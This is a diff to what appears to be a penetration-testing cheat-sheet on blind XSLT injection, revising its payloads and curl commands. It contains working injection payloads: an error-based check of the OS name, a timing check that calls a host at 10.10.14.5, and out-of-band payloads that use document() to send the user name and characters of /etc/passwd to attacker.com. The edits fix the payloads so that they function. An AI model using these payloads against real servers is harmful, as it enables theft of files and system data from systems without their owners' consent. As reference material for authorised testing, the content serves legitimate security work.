@@ -64,7 +64,7 @@ XSLT provides powerful functions like `document()`, `system-property()`, and cus
 - **Command:**
 
     ```bash
-    curl -i -X POST -d "xml=<payload>" http://target/app
+    curl -s -X POST --data-urlencode "xml=<xsl:if test=\"substring(system-property('os.name'),1,1)='W'\"><xsl:message terminate=\"yes\">A</xsl:message></xsl:if>" https://target/app
     ```
 
 - **Explanation:** This payload triggers an error if the operating system name starts with 'W' (e.g., Windows). The presence of an error in the response indicates a true condition.
@@ -76,17 +76,17 @@ XSLT provides powerful functions like `document()`, `system-property()`, and cus
 
     ```xml
     <xsl:if test="substring(system-property('user.name'),1,1)='a'">
-        <xsl:variable name="x" select="1 div 0"/>
+        <xsl:variable name="x" select="document('http://10.10.14.5:8080/delay')"/>
     </xsl:if>
     ```
 
 - **Command:**
 
     ```bash
-    curl -w '%{time_total}\\n' -X POST -d "xml=<payload>" http://target/app
+    curl -w '%{time_total}\n' -s -X POST --data-urlencode "xml=<xsl:if test=\"substring(system-property('user.name'),1,1)='a'\"><xsl:variable name='x' select=\"document('http://10.10.14.5:8080/delay')\"/></xsl:if>" https://target/app
     ```
 
-- **Explanation:** Here, a deliberate division-by-zero condition induces a delay when the condition is true, allowing inference based on response timing.
+- **Explanation:** Here, a deliberate external request induces a measurable delay when the condition is true, allowing inference based on response timing.
 
 ### Out-of-Band (OOB) Blind XSLT Injection via DNS
 
@@ -94,7 +94,7 @@ XSLT provides powerful functions like `document()`, `system-property()`, and cus
 - **Payload:**
 
     ```xml
-    <xsl:variable name="x" select="document('http://attacker.com/$(substring(system-property('user.name'),1,1))')"/>
+    <xsl:variable name="x" select="document(concat('http://attacker.com/', substring(system-property('user.name'),1,1)))"/>
     ```
 
 - **Explanation:** This forces the XSLT engine to make an HTTP request to an attacker-controlled server with leaked data. Monitor incoming requests on the attacker server to capture exfiltrated data.
@@ -105,7 +105,7 @@ XSLT provides powerful functions like `document()`, `system-property()`, and cus
 - **Payload:**
 
     ```xml
-    <xsl:variable name="x" select="document('http://attacker.com/$(substring(document('file:///etc/passwd'),1,1))')"/>
+    <xsl:variable name="x" select="document(concat('http://attacker.com/', substring(string(document('file:///etc/passwd')),1,1)))"/>
     ```
 
 - **Explanation:** This payload attempts to leak the first character of `/etc/passwd` by sending it as part of an HTTP request. Capture these requests to reconstruct the file contents character by character.
